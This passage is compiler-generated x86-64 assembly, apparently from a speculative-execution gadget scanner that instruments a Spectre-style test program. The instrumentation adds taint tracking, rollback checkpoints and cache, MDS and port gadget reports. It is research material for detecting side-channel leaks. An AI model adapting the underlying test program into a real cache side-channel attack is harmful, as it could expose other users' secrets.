            xorl %r13d,%r13d
            orb (dift_reg_tags+6),%r13b
            orb (dift_reg_tags),%r13b
            leaq 88(%rsp),%r15
            btcq $45,%r15
            movabsq $72340172838076673,%r14
            imulq %r14,%r13
            movq (memory_history_top),%r12
            movq (%r15),%r14
            movq %r15,(%r12)
            movq %r14,8(%r12)
            leaq 16(%r12),%r12
            movq %r12,(memory_history_top)
            movq %r13,(%r15)
            addq $8,%r15
.L__dift_done__teapot___534:

            nop
            leaq 88(%rsp),%r15
            movq (memory_history_top),%r12
            movq (%r15),%r14
            movq %r15,(%r12)
            movq %r14,8(%r12)
            leaq 16(%r12),%r12
            movq %r12,(memory_history_top)
            movq %rax,88(%rsp)
            xorl %r15d,%r15d
            movb %r15b,(dift_reg_tags)
.L__dift_done__teapot___536:

            nop
            movl $0,%eax
            leaq -8(%rsp),%r15
            movq (memory_history_top),%r12
            movq (%r15),%r14
            movq %r15,(%r12)
            movq %r14,8(%r12)
            leaq 16(%r12),%r12
            movq %r12,(memory_history_top)
            movq (instruction_cnt),%r12
            addq $3,%r12
            cmpq $250,%r12
            jge restore_checkpoint_ROB_LEN@PLT

            movq %r12,(instruction_cnt)
            callq secret_init__teapot__
.L__ret_transform_target_attacker_function__5ffacf72_e75f_4787_b4e6_ad84eef21fef__teapot__:

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $24,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            xorl %r14d,%r14d
            orb (dift_reg_tags+6),%r14b
            orb (dift_reg_tags),%r14b
            leaq 72(%rsp),%rsi
            btcq $45,%rsi
            movabsq $72340172838076673,%r15
            imulq %r15,%r14
            movq (memory_history_top),%r12
            movq (%rsi),%r15
            movq %rsi,(%r12)
            movq %r15,8(%r12)
            leaq 16(%r12),%r12
            movq %r12,(memory_history_top)
            movq %r14,(%rsi)
            addq $8,%rsi
.L__dift_done__teapot___540:

            nop
            leaq 72(%rsp),%rsi
            movq (memory_history_top),%r12
            movq (%rsi),%r15
            movq %rsi,(%r12)
            movq %r15,8(%r12)
            leaq 16(%r12),%r12
            movq %r12,(memory_history_top)
            movq %rax,72(%rsp)
            xorl %esi,%esi
            orb (dift_reg_tags),%sil
            movb %sil,(dift_reg_tags+3)
.L__dift_done__teapot___542:

            nop
            movq %rax,%rdx
            leaq 88(%rsp),%rsi
            xorq %r12,%r12
            orb (dift_reg_tags+6),%r12b
            testb $48,%r12b
            je .L__attacker_tags_check__teapot___543

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq %rsi,%rsi
            movq %r12,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_CACHE@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
.L__attacker_tags_check__teapot___543:

            testb $2,%r12b
            je .L__asan_check__teapot___543

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq %rsi,%rsi
            movq %r12,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_MDS@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
            orb $32,(dift_reg_queued_tag)
            movb $3,(dift_reg_queued_id)
.L__asan_check__teapot___543:

            movq %rsi,%r15
            shrq $3,%r15
            movb 2147450880(%r15),%r15b
            testb %r15b,%r15b
            je .L__mem_operand_policy_done__teapot___543
.L__asan_check_fail__teapot___543:

            testb $1,%r12b
            je .L__asan_check_fail_non_attacker__teapot___543
.L__asan_check_fail_attacker__teapot___543:

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq %rsi,%rsi
            movq %r12,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_MDS@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
            orb $16,(dift_reg_queued_tag)
            movb $3,(dift_reg_queued_id)
            jmp .L__mem_operand_policy_done__teapot___543
.L__asan_check_fail_non_attacker__teapot___543:

            orb $2,(dift_reg_queued_tag)
            movb $3,(dift_reg_queued_id)
.L__mem_operand_policy_done__teapot___543:

            nop
            leaq 88(%rsp),%r12
            btcq $45,%r12
            xorl %r15d,%r15d
            orb (dift_reg_tags+6),%r15b
            orb (dift_reg_tags+3),%r15b
            orb (%r12),%r15b
            movb %r15b,(dift_reg_tags+3)
            cmpb $0,(dift_reg_queued_tag)
            je .L__dift_done__teapot___544

            movb (dift_reg_queued_tag),%r15b
            movzbq (dift_reg_queued_id),%rsi
            orb %r15b,(dift_reg_tags)(%rsi)
            movb $0,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__dift_done__teapot___544:

            nop
            subq 88(%rsp),%rdx
            xorl %esi,%esi
            movb %sil,(dift_reg_tags+4)
.L__dift_done__teapot___545:

            nop
            leaq (.L_2061)(%rip),%rsi
            xorl %r15d,%r15d
            movb %r15b,(dift_reg_tags+5)
.L__dift_done__teapot___546:

            nop
            movl $1,%edi
            xorl %r15d,%r15d
            movb %r15b,(dift_reg_tags)
.L__dift_done__teapot___547:

            nop
            movl $0,%eax
            leaq -8(%rsp),%r15
            movq (memory_history_top),%r12
            movq (%r15),%r14
            movq %r15,(%r12)
            movq %r14,8(%r12)
            leaq 16(%r12),%r12
            movq %r12,(memory_history_top)
            jmp restore_checkpoint_EXT_LIB@PLT

            callq __printf_chk__dift_wrapper__@PLT
.L__ret_transform_target_attacker_function__979cd9b7_9ec6_4338_b2e3_f365c2ab1f9f__teapot__:

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $32,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            xorl %esi,%esi
            movb %sil,(dift_reg_tags+9)
.L__dift_done__teapot___551:

            nop
            movl $0,%r9d
            xorl %esi,%esi
            movb %sil,(dift_reg_tags+8)
.L__dift_done__teapot___552:

            nop
            movl $4294967295,%r8d
            xorl %esi,%esi
            movb %sil,(dift_reg_tags+2)
.L__dift_done__teapot___553:

            nop
            movl $34,%ecx
            xorl %esi,%esi
            movb %sil,(dift_reg_tags+3)
.L__dift_done__teapot___554:

            nop
            movl $3,%edx
            xorl %esi,%esi
            movb %sil,(dift_reg_tags+4)
.L__dift_done__teapot___555:

            nop
            movl $1048576,%esi
            xorl %r15d,%r15d
            movb %r15b,(dift_reg_tags+5)
.L__dift_done__teapot___556:

            nop
            movl $0,%edi
            leaq -8(%rsp),%r15
            movq (memory_history_top),%r12
            movq (%r15),%r14
            movq %r15,(%r12)
            movq %r14,8(%r12)
            leaq 16(%r12),%r12
            movq %r12,(memory_history_top)
            jmp restore_checkpoint_EXT_LIB@PLT

            callq mmap@PLT
.L__ret_transform_target_attacker_function__4657c448_5658_48f1_aed9_4ee4ad5a94b3__teapot__:

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $41,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            xorl %r12d,%r12d
            orb (dift_reg_tags),%r12b
            testb $48,%r12b
            je .L__check_ok__teapot___560

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq $0,%rsi
            movq %r12,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_PORT@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
.L__check_ok__teapot___560:

            nop
            movq (instruction_cnt),%r12
            addq $2,%r12
            cmpq $250,%r12
            jge restore_checkpoint_ROB_LEN@PLT

            movq %r12,(instruction_cnt)
            cmpq $-1,%rax
            leaq (.__trampoline__b88d08a0_3a05_4252_8951_2ed6bfab4973__teapot__)(%rip),%r12
            movq %r12,(checkpoint_target_metadata)
            leaq (.L__after_checkpoint__teapot___562)(%rip),%r12
            movq %r12,(checkpoint_target_metadata+8)
            leaq (.__branch_counter__b88d08a0_3a05_4252_8951_2ed6bfab4973__teapot__)(%rip),%r12
            movq %r12,(checkpoint_target_metadata+16)
            jmp make_checkpoint@PLT
.L__after_checkpoint__teapot___562:

            nop
            je .L_191e__teapot__
.L__trampoline_target__9fd54977_5f65_4ad2_b922_898b3ccaeb6f__teapot__:

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $46,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524296)
            lahf 
            seto %al
            movq %rax,(scratchpad+524288)
            movq (scratchpad+524296),%rax
            xorl %esi,%esi
            orb (dift_reg_tags),%sil
            movb %sil,(dift_reg_tags+15)
.L__dift_done__teapot___564:

            nop
            movq %rax,(scratchpad+524296)
            movq (scratchpad+524288),%rax
            addb $127,%al
            sahf 
            movq (scratchpad+524296),%rax
            movq %rax,%r15
            movq %rax,(scratchpad+524296)
            lahf 
            seto %al
            movq %rax,(scratchpad+524288)
            movq (scratchpad+524296),%rax
            xorl %esi,%esi
            movb %sil,(dift_reg_tags+3)
.L__dift_done__teapot___565:

            nop
            movq %rax,(scratchpad+524296)
            movq (scratchpad+524288),%rax
            addb $127,%al
            sahf 
            movq (scratchpad+524296),%rax
            movl $1048576,%edx
            movq %rax,(scratchpad+524296)
            lahf 
            seto %al
            movq %rax,(scratchpad+524288)
            movq (scratchpad+524296),%rax
            xorl %esi,%esi
            movb %sil,(dift_reg_tags+4)
.L__dift_done__teapot___566:

            nop
            movq %rax,(scratchpad+524296)
            movq (scratchpad+524288),%rax
            addb $127,%al
            sahf 
            movq (scratchpad+524296),%rax
            movl $1,%esi
            movq %rax,(scratchpad+524296)
            lahf 
            seto %al
            movq %rax,(scratchpad+524288)
            movq (scratchpad+524296),%rax
            xorl %r14d,%r14d
            orb (dift_reg_tags),%r14b
            movb %r14b,(dift_reg_tags+5)
.L__dift_done__teapot___567:

            nop
            movq %rax,(scratchpad+524296)
            movq (scratchpad+524288),%rax
            addb $127,%al
            sahf 
            movq (scratchpad+524296),%rax
            movq %rax,%rdi
            leaq -8(%rsp),%r14
            movq (memory_history_top),%r12
            movq (%r14),%r13
            movq %r14,(%r12)
            movq %r13,8(%r12)
            leaq 16(%r12),%r12
            movq %r12,(memory_history_top)
            jmp restore_checkpoint_EXT_LIB@PLT

            callq memset__dift_wrapper__@PLT
.L__ret_transform_target_attacker_function__97097815_8786_468c_bb16_b0f19021c1db__teapot__:

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $55,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524296)
            lahf 
            seto %al
            movq %rax,(scratchpad+524288)
            movq (scratchpad+524296),%rax
            xorl %r14d,%r14d
            movb %r14b,(dift_reg_tags)
.L__dift_done__teapot___571:

            nop
            movq %rax,(scratchpad+524296)
            movq (scratchpad+524288),%rax
            addb $127,%al
            sahf 
            movq (scratchpad+524296),%rax
            movl $0,%eax
            leaq -8(%rsp),%r14
            movq (memory_history_top),%r12
            movq (%r14),%r13
            movq %r14,(%r12)
            movq %r13,8(%r12)
            leaq 16(%r12),%r12
            movq %r12,(memory_history_top)
            movq %rax,(scratchpad+524296)
            lahf 
            seto %al
            movq %rax,(scratchpad+524288)
            movq (scratchpad+524296),%rax
            movq (instruction_cnt),%r12
            addq $2,%r12
            cmpq $250,%r12
            jge restore_checkpoint_ROB_LEN@PLT

            movq %r12,(instruction_cnt)
            movq %rax,(scratchpad+524296)
            movq (scratchpad+524288),%rax
            addb $127,%al
            sahf 
            movq (scratchpad+524296),%rax
            callq calibrate_latency__teapot__
.L__ret_transform_target_attacker_function__e07ba195_f6ea_44a3_aaeb_75ef67146022__teapot__:

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $14,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524296)
            lahf 
            seto %al
            movq %rax,(scratchpad+524288)
            movq (scratchpad+524296),%rax
            xorl %r14d,%r14d
            orb (dift_reg_tags),%r14b
            movb %r14b,(dift_reg_tags+14)
.L__dift_done__teapot___575:

            nop
            movq %rax,(scratchpad+524296)
            movq (scratchpad+524288),%rax
            addb $127,%al
            sahf 
            movq (scratchpad+524296),%rax
            movq %rax,%r14
            movq %rax,(scratchpad+524296)
            lahf 
            seto %al
            movq %rax,(scratchpad+524288)
            movq (scratchpad+524296),%rax
            xorl %r13d,%r13d
            movb %r13b,(dift_reg_tags+5)
.L__dift_done__teapot___576:

            nop
            movq %rax,(scratchpad+524296)
            movq (scratchpad+524288),%rax
            addb $127,%al
            sahf 
            movq (scratchpad+524296),%rax
            leaq (.L_2130)(%rip),%rdi
            leaq -8(%rsp),%r13
            movq (memory_history_top),%r12
            movq (%r13),%rbp
            movq %r13,(%r12)
            movq %rbp,8(%r12)
            leaq 16(%r12),%r12
            movq %r12,(memory_history_top)
            jmp restore_checkpoint_EXT_LIB@PLT

            callq puts@PLT
.L__ret_transform_target_attacker_function__fc56e38b_81e5_44ac_835e_d465fc6a59b5__teapot__:

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $23,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524296)
            lahf 
            seto %al
            movq %rax,(scratchpad+524288)
            movq (scratchpad+524296),%rax
            xorl %esi,%esi
            orb (dift_reg_tags+6),%sil
            movb %sil,(dift_reg_tags+5)
.L__dift_done__teapot___580:

            nop
            movq %rax,(scratchpad+524296)
            movq (scratchpad+524288),%rax
            addb $127,%al
            sahf 
            movq (scratchpad+524296),%rax
            leaq 96(%rsp),%rdi
            movq %rax,(scratchpad+524296)
            lahf 
            seto %al
            movq %rax,(scratchpad+524288)
            movq (scratchpad+524296),%rax
            xorl %esi,%esi
            movb %sil,(dift_reg_tags+2)
.L__dift_done__teapot___581:

            nop
            movq %rax,(scratchpad+524296)
            movq (scratchpad+524288),%rax
            addb $127,%al
            sahf 
            movq (scratchpad+524296),%rax
            movl $256,%ecx
            movq %rax,(scratchpad+524296)
            lahf 
            seto %al
            movq %rax,(scratchpad+524288)
            movq (scratchpad+524296),%rax
            xorl %esi,%esi
            movb %sil,(dift_reg_tags)
.L__dift_done__teapot___582:

            nop
            movq %rax,(scratchpad+524296)
            movq (scratchpad+524288),%rax
            addb $127,%al
            sahf 
            movq (scratchpad+524296),%rax
            movq %rax,(scratchpad+524296)
            lahf 
            seto %al
            movq %rax,(scratchpad+524288)
            movq (scratchpad+524296),%rax
            movq (instruction_cnt),%r12
            addq $3,%r12
            cmpq $250,%r12
            jge restore_checkpoint_ROB_LEN@PLT

            movq %r12,(instruction_cnt)
            movq %rax,(scratchpad+524296)
            movq (scratchpad+524288),%rax
            addb $127,%al
            sahf 
            movq (scratchpad+524296),%rax
            movl $0,%eax

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $30,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            leaq (%rdi),%rsi
            movq (memory_history_top),%r12
            movq (%rsi),%r13
            movq %rsi,(%r12)
            movq %r13,8(%r12)
            leaq 16(%r12),%r12
            movq %r12,(memory_history_top)
            jmp restore_checkpoint_EXT_LIB@PLT

            rep stosq (%rdi)

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $39,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            xorl %edx,%edx
            orb (dift_reg_tags+6),%dl
            leaq 2151(%rsp),%rsi
            btcq $45,%rsi
            movq (memory_history_top),%r12
            movq (%rsi),%r13
            movq %rsi,(%r12)
            movq %r13,8(%r12)
            leaq 16(%r12),%r12
            movq %r12,(memory_history_top)
            movb %dl,(%rsi)
            addq $8,%rsi
.L__dift_done__teapot___588:

            nop
            leaq 2151(%rsp),%rsi
            movq (memory_history_top),%r12
            movq (%rsi),%r13
            movq %rsi,(%r12)
            movq %r13,8(%r12)
            leaq 16(%r12),%r12
            movq %r12,(memory_history_top)
            movb $0,2151(%rsp)
            leaq 88(%rsp),%rsi
            xorq %r12,%r12
            orb (dift_reg_tags+6),%r12b
            testb $48,%r12b
            je .L__attacker_tags_check__teapot___590

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq %rsi,%rsi
            movq %r12,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_CACHE@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
.L__attacker_tags_check__teapot___590:

            testb $2,%r12b
            je .L__asan_check__teapot___590

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq %rsi,%rsi
            movq %r12,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_MDS@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
            orb $32,(dift_reg_queued_tag)
            movb $1,(dift_reg_queued_id)
.L__asan_check__teapot___590:

            movq %rsi,%r13
            shrq $3,%r13
            movb 2147450880(%r13),%r13b
            testb %r13b,%r13b
            je .L__mem_operand_policy_done__teapot___590
.L__asan_check_fail__teapot___590:

            testb $1,%r12b
            je .L__asan_check_fail_non_attacker__teapot___590
.L__asan_check_fail_attacker__teapot___590:

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq %rsi,%rsi
            movq %r12,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_MDS@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
            orb $16,(dift_reg_queued_tag)
            movb $1,(dift_reg_queued_id)
            jmp .L__mem_operand_policy_done__teapot___590
.L__asan_check_fail_non_attacker__teapot___590:

            orb $2,(dift_reg_queued_tag)
            movb $1,(dift_reg_queued_id)
.L__mem_operand_policy_done__teapot___590:

            nop
            leaq 88(%rsp),%r12
            btcq $45,%r12
            xorl %r13d,%r13d
            orb (dift_reg_tags+6),%r13b
            orb (%r12),%r13b
            movb %r13b,(dift_reg_tags+1)
            cmpb $0,(dift_reg_queued_tag)
            je .L__dift_done__teapot___591

            movb (dift_reg_queued_tag),%r13b
            movzbq (dift_reg_queued_id),%rsi
            orb %r13b,(dift_reg_tags)(%rsi)
            movb $0,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__dift_done__teapot___591:

            nop
            movq 88(%rsp),%rbx
            leaq 72(%rsp),%rsi
            xorq %r12,%r12
            orb (dift_reg_tags+6),%r12b
            testb $48,%r12b
            je .L__attacker_tags_check__teapot___592

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq %rsi,%rsi
            movq %r12,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_CACHE@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
.L__attacker_tags_check__teapot___592:

            testb $2,%r12b
            je .L__asan_check__teapot___592

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq %rsi,%rsi
            movq %r12,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_MDS@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
            orb $32,(dift_reg_queued_tag)
            movb $13,(dift_reg_queued_id)
.L__asan_check__teapot___592:

            movq %rsi,%r13
            shrq $3,%r13
            movb 2147450880(%r13),%r13b
            testb %r13b,%r13b
            je .L__mem_operand_policy_done__teapot___592
.L__asan_check_fail__teapot___592:

            testb $1,%r12b
            je .L__asan_check_fail_non_attacker__teapot___592
.L__asan_check_fail_attacker__teapot___592:

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq %rsi,%rsi
            movq %r12,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_MDS@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
            orb $16,(dift_reg_queued_tag)
            movb $13,(dift_reg_queued_id)
            jmp .L__mem_operand_policy_done__teapot___592
.L__asan_check_fail_non_attacker__teapot___592:

            orb $2,(dift_reg_queued_tag)
            movb $13,(dift_reg_queued_id)
.L__mem_operand_policy_done__teapot___592:

            nop
            leaq 72(%rsp),%r12
            btcq $45,%r12
            xorl %r13d,%r13d
            orb (dift_reg_tags+6),%r13b
            orb (%r12),%r13b
            movb %r13b,(dift_reg_tags+13)
            cmpb $0,(dift_reg_queued_tag)
            je .L__dift_done__teapot___593

            movb (dift_reg_queued_tag),%r13b
            movzbq (dift_reg_queued_id),%rsi
            orb %r13b,(dift_reg_tags)(%rsi)
            movb $0,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__dift_done__teapot___593:

            nop
            movq 72(%rsp),%r13
            xorl %esi,%esi
            orb (dift_reg_tags+13),%sil
            movb %sil,(dift_reg_tags+7)
.L__dift_done__teapot___594:

            nop
            movq %r13,%rbp
            xorl %esi,%esi
            orb (dift_reg_tags+7),%sil
            orb (dift_reg_tags+1),%sil
            movb %sil,(dift_reg_tags+7)
.L__dift_done__teapot___595:

            nop
            subq %rbx,%rbp
            xorl %edi,%edi
            orb (dift_reg_tags+7),%dil
            orb (dift_reg_tags+6),%dil
            leaq 16(%rsp),%rsi
            btcq $45,%rsi
            movabsq $72340172838076673,%rdx
            imulq %rdx,%rdi
            movq (memory_history_top),%r12
            movq (%rsi),%rdx
            movq %rsi,(%r12)
            movq %rdx,8(%r12)
            leaq 16(%r12),%r12
            movq %r12,(memory_history_top)
            movq %rdi,(%rsi)
            addq $8,%rsi
.L__dift_done__teapot___596:

            nop
            leaq 16(%rsp),%rsi
            movq (memory_history_top),%r12
            movq (%rsi),%rdx
            movq %rsi,(%r12)
            movq %rdx,8(%r12)
            leaq 16(%r12),%r12
            movq %r12,(memory_history_top)
            movq %rbp,16(%rsp)
            xorl %esi,%esi
            orb (dift_reg_tags+1),%sil
            movb %sil,(dift_reg_tags+2)
.L__dift_done__teapot___598:

            nop
            movq %rbx,%rcx
            xorl %esi,%esi
            orb (dift_reg_tags+13),%sil
            movb %sil,(dift_reg_tags+3)
.L__dift_done__teapot___599:

            nop
            movq %r13,%rdx
            xorl %eax,%eax
            movb %al,(dift_reg_tags+4)
.L__dift_done__teapot___600:

            nop
            leaq (.L_2160)(%rip),%rsi
            xorl %eax,%eax
            movb %al,(dift_reg_tags+5)
.L__dift_done__teapot___601:

            nop
            movl $1,%edi
            movq %rbx,(scratchpad+524288)
            leaq -8(%rsp),%r12
            movq (memory_history_top),%rbx
            movq (%r12),%rax
            movq %r12,(%rbx)
            movq %rax,8(%rbx)
            leaq 16(%rbx),%rbx
            movq %rbx,(memory_history_top)
            movq (scratchpad+524288),%rbx
            jmp restore_checkpoint_EXT_LIB@PLT

            callq __printf_chk__dift_wrapper__@PLT
.L__ret_transform_target_attacker_function__3543858f_250f_4b04_949b_486380d30134__teapot__:

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $45,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            xorl %esi,%esi
            orb (dift_reg_tags+7),%sil
            movb %sil,(dift_reg_tags+8)
.L__dift_done__teapot___605:

            nop
            movq %rbp,%r8
            xorl %esi,%esi
            orb (dift_reg_tags+1),%sil
            movb %sil,(dift_reg_tags+2)
.L__dift_done__teapot___606:

            nop
            movq %rbx,%rcx
            xorl %esi,%esi
            orb (dift_reg_tags+13),%sil
            movb %sil,(dift_reg_tags+3)
.L__dift_done__teapot___607:

            nop
            movq %r13,%rdx
            xorl %esi,%esi
            movb %sil,(dift_reg_tags+4)
.L__dift_done__teapot___608:

            nop
            leaq (.L_2188)(%rip),%rsi
            xorl %r13d,%r13d
            movb %r13b,(dift_reg_tags+5)
.L__dift_done__teapot___609:

            nop
            movl $1,%edi
            xorl %r13d,%r13d
            movb %r13b,(dift_reg_tags)
.L__dift_done__teapot___610:

            nop
            movl $0,%eax
            leaq -8(%rsp),%r13
            movq (memory_history_top),%r12
            movq (%r13),%rax
            movq %r13,(%r12)
            movq %rax,8(%r12)
            leaq 16(%r12),%r12
            movq %r12,(memory_history_top)
            jmp restore_checkpoint_EXT_LIB@PLT

            callq __printf_chk__dift_wrapper__@PLT
.L__ret_transform_target_attacker_function__d1b90268_6450_4902_b730_b1f93ab1ed91__teapot__:

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $51,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            xorl %r13d,%r13d
            movb %r13b,(dift_reg_tags+5)
.L__dift_done__teapot___614:

            nop
            leaq (.L_2130)(%rip),%rdi
            leaq -8(%rsp),%r13
            movq (memory_history_top),%r12
            movq (%r13),%rax
            movq %r13,(%r12)
            movq %rax,8(%r12)
            leaq 16(%r12),%r12
            movq %r12,(memory_history_top)
            jmp restore_checkpoint_EXT_LIB@PLT

            callq puts@PLT
.L__ret_transform_target_attacker_function__9c5af263_c596_4a94_837d_62fb05aa069a__teapot__:

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $61,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            leaq (array_size)(%rip),%r12
            btcq $45,%r12
            xorl %r13d,%r13d
            orb (%r12),%r13b
            movb %r13b,(dift_reg_tags)
            cmpb $0,(dift_reg_queued_tag)
            je .L__dift_done__teapot___618

            movb (dift_reg_queued_tag),%r13b
            movzbq (dift_reg_queued_id),%rsi
            orb %r13b,(dift_reg_tags)(%rsi)
            movb $0,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__dift_done__teapot___618:

            nop
            movl (array_size)(%rip),%eax
            xorl %esi,%esi
            orb (dift_reg_tags),%sil
            movb %sil,(dift_reg_tags+1)
.L__dift_done__teapot___619:

            nop
            leal -1(%rax),%ebx
            xorl %edx,%edx
            orb (dift_reg_tags+6),%dl
            orb (dift_reg_tags+1),%dl
            leaq 24(%rsp),%rsi
            btcq $45,%rsi
            movabsq $72340172838076673,%r13
            imulq %r13,%rdx
            movq (memory_history_top),%r12
            movq (%rsi),%r13
            movq %rsi,(%r12)
            movq %r13,8(%r12)
            leaq 16(%r12),%r12
            movq %r12,(memory_history_top)
            movq %rdx,(%rsi)
            addq $8,%rsi
.L__dift_done__teapot___620:

            nop
            leaq 24(%rsp),%rsi
            movq (memory_history_top),%r12
            movq (%rsi),%r13
            movq %rsi,(%r12)
            movq %r13,8(%r12)
            leaq 16(%r12),%r12
            movq %r12,(memory_history_top)
            movq %rbx,24(%rsp)
            leaq (array_size)(%rip),%r12
            btcq $45,%r12
            xorl %r13d,%r13d
            orb (%r12),%r13b
            movb %r13b,(dift_reg_tags)
            cmpb $0,(dift_reg_queued_tag)
            je .L__dift_done__teapot___622

            movb (dift_reg_queued_tag),%r13b
            movzbq (dift_reg_queued_id),%rsi
            orb %r13b,(dift_reg_tags)(%rsi)
            movb $0,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__dift_done__teapot___622:

            nop
            movl (array_size)(%rip),%eax
            movq (instruction_cnt),%r12
            addq $15,%r12
            cmpq $250,%r12
            jge restore_checkpoint_ROB_LEN@PLT

            movq %r12,(instruction_cnt)
            shrl $1,%eax
            movl %eax,%eax
            movq %rax,(scratchpad+524296)
            lahf 
            seto %al
            movq %rax,(scratchpad+524288)
            movq (scratchpad+524296),%rax
            xorl %edx,%edx
            orb (dift_reg_tags+6),%dl
            orb (dift_reg_tags),%dl
            leaq 8(%rsp),%rsi
            btcq $45,%rsi
            movabsq $72340172838076673,%r13
            imulq %r13,%rdx
            movq (memory_history_top),%r12
            movq (%rsi),%r13
            movq %rsi,(%r12)
            movq %r13,8(%r12)
            leaq 16(%r12),%r12
            movq %r12,(memory_history_top)
            movq %rdx,(%rsi)
            addq $8,%rsi
.L__dift_done__teapot___624:

            nop
            movq %rax,(scratchpad+524296)
            movq (scratchpad+524288),%rax
            addb $127,%al
            sahf 
            movq (scratchpad+524296),%rax
            leaq 8(%rsp),%rsi
            movq (memory_history_top),%r12
            movq (%rsi),%r13
